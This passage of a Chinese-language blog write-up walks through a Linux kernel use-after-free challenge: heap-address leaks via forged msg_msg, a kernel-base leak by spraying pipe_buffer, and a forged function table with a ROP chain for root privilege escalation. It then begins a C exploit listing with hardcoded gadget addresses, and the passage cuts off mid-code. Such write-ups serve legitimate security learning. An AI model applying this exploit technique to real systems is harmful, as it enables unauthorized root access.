åŸŸè®¾ä¸ºä¸€ä¸ªè¾ƒå¤§å€¼ï¼Œ<strong>ä»è€Œè¶Šç•Œè¯»å–åˆ°ç›¸é‚»è¾…åŠ©æ¶ˆæ¯çš„ headerï¼Œæ³„éœ²å‡ºå †ä¸Šåœ°å€</strong></p><p>æˆ‘ä»¬æ³„éœ²å‡ºæ¥çš„æ˜¯å“ªä¸ªåœ°å€ï¼Ÿè®©æˆ‘ä»¬é‡æ–°å°†ç›®å…‰æ”¾å›åˆ°æ¶ˆæ¯é˜Ÿåˆ—çš„ç»“æ„ä¸Šï¼š</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>æˆ‘ä»¬ä¸éš¾çŸ¥é“çš„æ˜¯ï¼Œè¯¥è¾…åŠ©æ¶ˆæ¯çš„ prev æŒ‡é’ˆæŒ‡å‘å…¶ä¸»æ¶ˆæ¯ï¼Œè€Œè¯¥è¾…åŠ©æ¶ˆæ¯çš„ next æŒ‡é’ˆæŒ‡å‘è¯¥æ¶ˆæ¯é˜Ÿåˆ—çš„ <code>msg_queue</code> ç»“æ„ï¼Œè¿™æ˜¯ç›®å‰æˆ‘ä»¬å·²çŸ¥çš„ä¸¤ä¸ªâ€œå †ä¸Šåœ°å€â€</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä¼ªé€  <code>msg_msg-&gt;next</code>ï¼Œ<strong>å°†å…¶æŒ‡å‘æˆ‘ä»¬çš„ UAF object ç›¸é‚»çš„è¾…åŠ©æ¶ˆæ¯å¯¹åº”çš„ä¸»æ¶ˆæ¯å¤´éƒ¨å¾€å‰ï¼Œä»è€Œè¯»å‡ºè¯¥ä¸»æ¶ˆæ¯çš„å¤´éƒ¨ï¼Œæ³„éœ²å‡ºå¯¹åº”çš„è¾…åŠ©æ¶ˆæ¯çš„åœ°å€</strong>ï¼Œæœ‰äº†è¿™ä¸ªè¾…åŠ©æ¶ˆæ¯çš„åœ°å€ï¼Œå†å‡å» 0x400 <strong>ä¾¿æ˜¯æˆ‘ä»¬çš„ UAF å¯¹è±¡çš„åœ°å€</strong></p><blockquote><p>é€šè¿‡ä¼ªé€  msg_msg-&gt;next å¯ä»¥å®Œæˆä»»æ„åœ°å€è¯»ï¼Œå‚è§<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">è¿™é‡Œ</a></p></blockquote><h3 id="Step-IV-å †å–·-pipe-bufferï¼Œæ³„éœ²å†…æ ¸åŸºå€">Step.IV å †å–· <code>pipe_buffer</code>ï¼Œæ³„éœ²å†…æ ¸åŸºå€</h3><p>ç°åœ¨æˆ‘ä»¬å·²çŸ¥äº†å¯æ§åŒºåŸŸçš„åœ°å€ï¼Œæ¥ä¸‹æ¥è®©æˆ‘ä»¬æ¥è€ƒè™‘æ³„éœ²å†…æ ¸ .text æ®µçš„åŸºå€ï¼Œä»¥åŠå¦‚ä½•åŠ«æŒ RIP å®Œæˆææƒ</p><p>ä¹‹å‰æˆ‘ä»¬ä¸ºä»€ä¹ˆå°†è¾…åŠ©æ¶ˆæ¯çš„å¤§å°è®¾ä¸º 0x400ï¼Ÿé™¤äº†æ–¹ä¾¿å¯¹é½ä»¥å¤–ï¼Œè¿˜æœ‰ä¸€å±‚è€ƒè™‘å°±æ˜¯è¿™ä¸ªå¤§å°åˆšå¥½æœ‰ä¸€ä¸ªååˆ†å®ç”¨çš„ç»“æ„ä½“ <code>pipe_buffer</code> æ•°ç»„ï¼Œ<strong>æ—¢èƒ½å¸®æˆ‘ä»¬æ³„éœ²å†…æ ¸ä»£ç æ®µåŸºå€ï¼Œä¹Ÿèƒ½å¸®æˆ‘ä»¬åŠ«æŒ RIP</strong></p><p>å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç®¡é“æ—¶ï¼Œåœ¨å†…æ ¸ä¸­ä¼šç”Ÿæˆæ•°ä¸ªè¿ç»­çš„ <code>pipe_buffer</code> ç»“æ„ä½“ï¼Œç”³è¯·çš„å†…å­˜æ€»å¤§å°åˆšå¥½ä¼šè®©å†…æ ¸ä» kmalloc-1k ä¸­å–å‡ºä¸€ä¸ª object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *struct pipe_buffer - a linux kernel pipe buffer</span><br><span class="hljs-comment"> *@page: the page containing the data for the pipe buffer</span><br><span class="hljs-comment"> *@offset: offset of data inside the @page</span><br><span class="hljs-comment"> *@len: length of data inside the @page</span><br><span class="hljs-comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span><br><span class="hljs-comment"> *@flags: pipe buffer flags. See above.</span><br><span class="hljs-comment"> *@private: private data owned by the ops.</span><br><span class="hljs-comment"> **/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br></code></pre></td></tr></table></figure><p>åœ¨ <code>pipe_buffer</code> ä¸­å­˜åœ¨ä¸€ä¸ªå‡½æ•°è¡¨æˆå‘˜ <code>pipe_buf_operations</code> ï¼Œå…¶æŒ‡å‘å†…æ ¸ä¸­çš„å‡½æ•°è¡¨ <code>anon_pipe_buf_ops</code>ï¼Œè‹¥æˆ‘ä»¬èƒ½å¤Ÿå°†å…¶è¯»å‡ºï¼Œä¾¿èƒ½æ³„éœ²å‡ºå†…æ ¸åŸºå€ï¼Œæ“ä½œå¦‚ä¸‹ï¼š</p><ul><li>åˆ©ç”¨ <code>sk_buff</code> ä¿®å¤è¾…åŠ©æ¶ˆæ¯ï¼Œä¹‹åä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ¥æ”¶è¯¥è¾…åŠ©æ¶ˆæ¯ï¼Œæ­¤æ—¶è¯¥ object é‡å› slub ä¸­ï¼Œä½† <code>sk_buff</code> ä»æŒ‡å‘è¯¥ object</li><li>å–·å°„ <code>pipe_buffer</code>ï¼Œä¹‹åå†æ¥æ”¶ <code>sk_buff</code> æ•°æ®åŒ…ï¼Œ<strong>æˆ‘ä»¬ä¾¿èƒ½è¯»å‡º pipe_buffer ä¸Šæ•°æ®ï¼Œæ³„éœ²å†…æ ¸åŸºå€</strong></li></ul><h3 id="Step-V-ä¼ªé€ -pipe-bufferï¼Œæ„é€ -ROPï¼ŒåŠ«æŒ-RIPï¼Œå®Œæˆææƒ">Step.V ä¼ªé€  pipe_bufferï¼Œæ„é€  ROPï¼ŒåŠ«æŒ RIPï¼Œå®Œæˆææƒ</h3><p>å½“æˆ‘ä»¬å…³é—­äº†ç®¡é“çš„ä¸¤ç«¯æ—¶ï¼Œä¼šè§¦å‘ <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> è¿™ä¸€æŒ‡é’ˆï¼Œè€Œ UAF object çš„åœ°å€å¯¹æˆ‘ä»¬è€Œè¨€æ˜¯å·²çŸ¥çš„ï¼Œå› æ­¤<strong>æˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨ sk_buff åœ¨ UAF object ä¸Šä¼ªé€ å‡½æ•°è¡¨ä¸æ„é€  ROP chainï¼Œå†é€‰ä¸€æ¡è¶³å¤Ÿåˆé€‚çš„ gadget å®Œæˆæ ˆè¿ç§»ä¾¿èƒ½åŠ«æŒ RIP å®Œæˆææƒ</strong></p><p><img src="https://s2.loli.net/2022/05/17/MjuSNf7tmw64hTn.png" alt="image.png"></p><h3 id="Final-EXPLOIT">Final EXPLOIT</h3><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;err.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_SIZE 96</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_SIZE 0x400</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_TYPE    0x41</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_TYPE  0x42</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG     0xAAAAAAAA</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKET_NUM 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_BUFF_NUM 128</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_NUM 256</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NUM 4096</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OBJ_ADD     0x1234</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OBJ_EDIT    0x4321</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OBJ_SHOW 0xbeef</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OBJ_DEL     0xdead</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810d2ac0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff82c6d580</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff810d25c0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81c00ff0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810938f0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ANON_PIPE_BUF_OPS 0xffffffff8203fe40</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FREE_PIPE_INFO 0xffffffff81327570</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_R14_POP_RBP_RET 0xffffffff81003364</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSH_RSI_POP_RSP_POP_4VAL_RET 0xffffffff812dbede</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CALL_RSI_PTR 0xffffffff8105acec</span><br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_sp, user_rflags;<br><span class="hljs-type">size_t</span> kernel_offset, kernel_base = <span class="hljs-number">0xffffffff81000000</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred, commit_creds, swapgs_restore_regs_and_return_to_usermode, init_cred;<br><br><span class="hljs-type">long</span> dev_fd;<br><span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>], pipe_fd2[<span class="hljs-number">2</span>], pipe_fd_1;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * skb_shared_info need to take 320 bytes at the tail</span><br><span class="hljs-comment"> * so the max size of buf we should send is:</span><br><span class="hljs-comment"> * 1024 - 320 = 704</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">char</span> fake_secondary_msg[<span class="hljs-number">704</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    ioctl(dev_fd, OBJ_ADD);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    ioctl(dev_fd, OBJ_DEL);<br>&#125;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_sp, user_rflags;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    prev;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br>    <span class="hljs-type">uint64_t</span>    m_type;<br>    <span class="hljs-type">uint64_t</span>    m_ts;<br>    <span class="hljs-type">uint64_t</span>    next;<br>    <span class="hljs-type">uint64_t</span>    security;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    next;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[PRIMARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;primary_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>&#125;secondary_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> mtype;<br>    <span class="hljs-type">char</span> mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) + <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msgseg)];<br>&#125; oob_msg;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    page;<br>    <span class="hljs-type">uint32_t</span>    offset, len;<br>    <span class="hljs-type">uint64_t</span>    ops;<br>    <span class="hljs-type">uint32_t</span>    flags;<br>    <span class="hljs-type">uint32_t</span>    padding;<br>    <span class="hljs-type">uint64_t</span>    private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">uint64_t</span>    confirm;<br>    <span class="hljs-type">uint64_t</span>    release;<br>    <span class="hljs-type">uint64_t</span>    try_steal;<br>    <span class="hljs-type">uint64_t</span>    get;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">readMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz - <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">long</span>), msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">writeMsg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    *(<span class="hljs-type">long</span>*)msgp = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz - <span 